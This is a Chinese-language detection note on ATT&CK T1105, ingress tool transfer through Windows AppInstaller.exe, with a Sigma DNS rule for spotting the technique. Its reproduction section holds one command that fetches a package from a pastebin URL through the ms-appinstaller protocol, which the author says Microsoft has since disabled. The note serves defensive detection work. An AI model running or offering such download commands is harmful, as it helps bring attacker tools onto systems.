# T1105-win-入口工具转移-AppInstaller.exe(白名单、失效)

## 来自ATT&CK的描述

攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。

## 测试案例
AppInstaller.exe用于在 Windows 10 上安装AppX/MSIX应用程序的工具。

**路径:**
```
C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe
```

AppInstaller.exe 由 URI 的默认处理程序生成，它尝试从 URL 加载/安装包并保存在
```
C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>
```

用例：从 Internet 下载文件
所需权限：用户
操作系统：Windows 10

## 检测日志

windows安全日志

## 测试复现

```
C:\Users\liyang>start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw
```

不过很遗憾，微软禁用ms-appinstaller 协议，用以阻止恶意软件传播。
## 测试留痕
无

## 检测方法/思路
这里参考Sigma官方规则。
```
title: AppInstaller Attempts From URL by DNS

id: 7cff77e1-9663-46a3-8260-17f2e1aa9d0a

description: AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL

status: experimental

date: 2021/11/24

author: frack113

tags:

- attack.command_and_control

- attack.t1105

references:

- https://twitter.com/notwhickey/status/1333900137232523264

- https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/

logsource:

product: windows

category: dns_query

detection:

selection:

Image|startswith: C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_

Image|endswith: \AppInstaller.exe

condition: selection

falsepositives:

- Unknown

level: medium

```


## 参考推荐

MITRE-ATT&CK-T1105

<https://attack.mitre.org/techniques/T1105>

AppInstaller.exe

<https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/>

Sigma-win_dq_lobas_appinstaller

<https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml>